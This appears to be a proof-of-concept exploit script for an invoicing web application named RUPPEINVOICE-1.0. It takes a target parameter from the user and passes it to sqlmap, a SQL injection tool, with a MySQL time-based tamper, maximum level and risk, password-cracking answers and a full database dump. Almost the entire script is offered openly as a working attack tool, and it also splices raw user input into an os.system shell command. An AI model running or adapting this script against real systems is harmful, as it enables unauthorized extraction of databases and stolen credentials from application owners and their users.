#!/usr/bin/python
# nu11secur1ty 2023-2024
import time
import os
from colorama import init, Fore, Back, Style
init(convert=True)
import requests

print("The PoC process will be continue...\n")
time.sleep(3)

# Parameter
print(Fore.GREEN +"Put your special parameter for attacking here, or press Enter to quit the program...\n")
print(Style.RESET_ALL)

print(Fore.RED)
param_spec = input()
print(Style.RESET_ALL)

# Here you can modify your OWN injection construction!
# Your EXPLOIT ENVIRONMENT 
env = 'C:\\Users\\nu11secur1ty\\Desktop\\RUPPEINVOICE-1.0\\SQLi\\'
os.system('python D:\\CVE\\sqlmap-nu11secur1ty\\sqlmap.py -r '+env+'exploit.txt -p '+param_spec+' --tamper=space2comment --dbms=mysql --time-sec=7 --random-agent --level=5 --risk=3 --batch --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump')

print(Fore.RED +"Happy hunting with nu11secur1ty =)")
print(Style.RESET_ALL)
